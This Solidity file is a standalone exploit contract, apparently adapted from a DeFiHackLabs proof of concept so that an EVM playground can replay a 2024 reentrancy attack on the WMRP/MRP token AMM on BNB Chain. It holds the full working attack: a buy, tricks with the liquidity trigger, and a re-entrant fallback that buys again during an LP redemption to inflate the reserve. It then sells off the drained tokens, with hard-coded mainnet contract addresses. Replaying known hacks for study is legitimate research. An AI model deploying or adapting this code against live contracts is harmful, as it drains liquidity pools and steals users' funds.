// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-MRP).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (`Exploit is Test`; `attacker = address(this)`, and the
// re-entrant callback lives in the test's own `fallback()`), so there is no
// standalone attack contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (test/MRP_exp.sol:29-51) so the
// playground can deploy it and record `attack()`.
//
// Root cause: WMRP is an ERC-314-style self-contained AMM (it holds BNB +
// WMRP and prices swaps off its own balance) with a Uniswap-V2-style LP
// layer bolted on top of the SAME pool. `_addLiquidity` mints LP against the
// reserve with the caller's own deposit backed out (i.e. the pre-attack
// pool), while `_removeLiquidity` redeems those LP shares against the LIVE
// reserve — and pays the BNB out via a raw `call` (`_safeEthTransfer`)
// *before* the burn/withdraw settle. The attacker's `fallback` re-enters
// with a 58 BNB buy the instant it receives that payout, inflating the BNB
// reserve mid-redemption, so the LP burn (still unwinding) pays out against
// an inflated reserve. The attacker walks out with ~17.96 BNB — essentially
// the pool's entire tradeable reserve — then liquidates the residual MRP
// back through the MRP AMM.

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract MRPDrain {
    // WMRP: the vulnerable self-contained AMM + LP contract (BSC).
    IERC20 constant WMRP = IERC20(0x35F5cEf517317694DF8c50C894080caA8c92AF7D);
    // MRP: the companion ERC-314 AMM token WMRP wraps.
    IERC20 constant MRP = IERC20(0xA0Ba9d82014B33137B195b5753F3BC8Bf15700a3);

    function attack() external {
        // Step 1: cheap buy — 43.14 BNB routed to WMRP.receive() -> _buy().
        // 7% buy fee nets the attacker ~5,119.48 MRP.
        (bool s1, ) = address(WMRP).call{value: 43.14 ether}("");
        require(s1, "buy failed");

        // Step 2: WMRP.transfer(WMRP, 0) opens this account's add-liquidity
        // trigger (_openLiquidityTrigger) - any BNB sent next routes to
        // _addLiquidity instead of _buy, and any MRP deposited via
        // MRP's handle() callback is minted as WMRP without being sold.
        WMRP.transfer(address(WMRP), 0);

        // Step 3: send the just-bought MRP back to WMRP. MRP recognizes
        // WMRP as a registered trigger and forwards handle(account, amount);
        // with the add-liquidity trigger open, handle() mints WMRP 1:1 and
        // SKIPS the auto-sell, stockpiling WMRP cheaply for step 4.
        MRP.transfer(address(WMRP), MRP.balanceOf(address(this)));

        // Step 4: 58 BNB routed to _addLiquidity (trigger still open).
        // LP is minted against the reserve with this deposit backed out -
        // i.e. against the PRE-attack pool.
        (bool s2, ) = address(WMRP).call{value: 58 ether}("");
        require(s2, "addLiquidity failed");

        // Step 5: WMRP.transfer(attacker, 0) -> _removeLiquidity(). Redeems
        // the just-minted LP against the LIVE reserve and pays BNB out via
        // a raw call BEFORE the burn/withdraw settle - the call lands in
        // this contract's fallback() below, which re-enters with a 58 BNB
        // buy, inflating the BNB reserve mid-redemption.
        WMRP.transfer(address(this), 0);

        // Step 6: deposit 1,268 MRP; trigger is now off (fallback's
        // re-entrant buy turned it off), so handle() deposits AND sells,
        // topping up the attacker's MRP from the now-inflated pool.
        MRP.transfer(address(WMRP), 1268 ether);

        // Step 7: re-arm the trigger (not strictly required for profit;
        // mirrors the original PoC exactly).
        WMRP.transfer(address(WMRP), 0);

        require(MRP.balanceOf(address(this)) >= 6000 ether, "The attack is invalid.");

        // Step 8: liquidate the residual MRP back through the MRP AMM in
        // 20 chunks (MRP.transfer(MRP, amount) -> _sell).
        uint256 transferAmount = MRP.balanceOf(address(this)) / 20;
        uint256 i = 0;
        while (i < 20) {
            MRP.transfer(address(MRP), transferAmount);
            i++;
        }
    }

    // Re-entrant callback: WMRP._removeLiquidity's raw `call` payout lands
    // here. Re-buy with 58 BNB while the outer removeLiquidity call is still
    // unwinding, inflating the BNB reserve it reads for the remaining steps.
    fallback() external payable {
        if (msg.value > 50 ether && msg.value < 100 ether) {
            address(WMRP).call{value: 58 ether}("");
        }
    }

    // WMRP checks on314Swaper() via staticcall on any account it forwards
    // MRP to; must not revert and must not match the "swapper" selector.
    function on314Swaper() public pure returns (bytes4) {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x1457b0ed) {
            return 0x00000000;
        }
        revert("no such function");
    }
}
